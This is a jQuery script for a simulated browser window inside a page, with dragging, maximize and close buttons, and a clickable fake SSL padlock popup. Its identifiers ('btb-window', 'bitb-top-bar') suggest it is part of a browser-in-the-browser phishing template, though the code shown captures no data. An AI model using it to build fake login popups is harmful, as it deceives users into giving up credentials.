var titleBar = document.getElementById("title-bar");
var exit = document.getElementById("exit");
var max = document.getElementById("maximize");
var min = document.getElementById("minimize");



titleBar.addEventListener('dblclick', function handleMouseOver() {
    enlarge();
});

titleBar.addEventListener('mouseout', function handleMouseOver() {
  titleBar.style.cursor = 'default';
});


//////////////// Make window draggable start ////////////////
// Make the DIV element draggable:


var draggable = $('#btb-window');
var winScroll = $('.win-scroll');
var title = $('#title-bar');

title.on('mousedown', function(e) {
    var dr = $(draggable).addClass("drag");
    var dt = $('.win-scroll').addClass("drag");
    
    var initialDiffX = dt.offset().left - dr.offset().left;
    var initialDiffY = dt.offset().top - dr.offset().top;
    
    var ypos = e.pageY - dr.offset().top;
    var xpos = e.pageX - dr.offset().left;

    $(document.body).on('mousemove', function(e) {
        var itop = e.pageY - ypos;
        var ileft = e.pageX - xpos;

        if(dr.hasClass("drag")) {
            dr.offset({top: itop, left: ileft});
        }
        
        if(dt.hasClass("drag")) {
            dt.offset({top: itop + initialDiffY, left: ileft + initialDiffX});
        }
    }).on('mouseup', function(e) {
        dr.removeClass("drag");
        dt.removeClass("drag");
    });
});


//////////////// Make window draggable end ////////////////

// Make the DIV element draggable:
var draggable = $('#btb-window');
var title = $('#title-bar');

title.on('mousedown', function(e){
	var dr = $(draggable).addClass("drag");
	height = dr.outerHeight();
	width = dr.outerWidth();
	ypos = dr.offset().top + height - e.pageY,
	xpos = dr.offset().left + width - e.pageX;
	$(document.body).on('mousemove', function(e){
		var itop = e.pageY + ypos - height;
		var ileft = e.pageX + xpos - width;
		if(dr.hasClass("drag")){
			dr.offset({top: itop,left: ileft});
			winScroll.offset({top: itop, left: ileft});
		}
	}).on('mouseup', function(e){
			dr.removeClass("drag");
	});
});
//////////////// Make window draggable end ////////////////


////////////////// Onclick listeners //////////////////
// X button functionality


$("#exit").click(function(){
    $("#btb-window").css("display", "none");
});

$("#ssl-padlock").click(toggleSSLPopup);
$("#ssl-close").click(toggleSSLPopup);

function toggleSSLPopup(){
    var sslPopup = $("#ssl-popup");
    if (sslPopup.hasClass("visible")){
        sslPopup.removeClass("visible")
    } else (
        sslPopup.addClass("visible")
    )
  }



// Maximize button functionality
$("#maximize").click(enlarge);






function enlarge(){
  if(max.classList.contains("enlarged")){
    $("#btb-window").css("width", "40vw");
    $("#btb-window").css("height", "81vh");
    // $("#btb-window").css("top", "7%");
    // $("#btb-window").css("left", "30%");
    $("#title-bar-width").css('width', '100%').css('width', '+=2px');
    $("#content").css("width", "100%");
    $("#maximize").removeClass("enlarged");
  }
  else{
    $("#btb-window").css("width", "70vw");
    $("#btb-window").css("height", "81vh");
    // $("#btb-window").css("top", "5%");
    // $("#btb-window").css("left", "15%");
    $("#title-bar-width").css('width', '100%').css('width', '+=2px');
    $("#content").css("width", "100%");
    $("#maximize").addClass("enlarged");
  }
}






// // FOR POISITIONING ISSUES

// $(document).ready(function() {
//     adjustPopupHeight();

//     // If there are dynamic elements that might change the height, you can also listen for mutations
//     const observer = new MutationObserver(adjustPopupHeight);
//     observer.observe(document.querySelector('.win-scroll'), { childList: true, subtree: true });
// });

// function adjustPopupHeight() {
//     const winScrollHeight = $('.win-scroll').outerHeight(true);
//     const bitbTopBarHeight = $('#bitb-top-bar').outerHeight(true);
//     const newPopupHeight = winScrollHeight + bitbTopBarHeight + 40; // Adding 40 for potential padding or margin

//     $('#btb-window').height(newPopupHeight);
// }

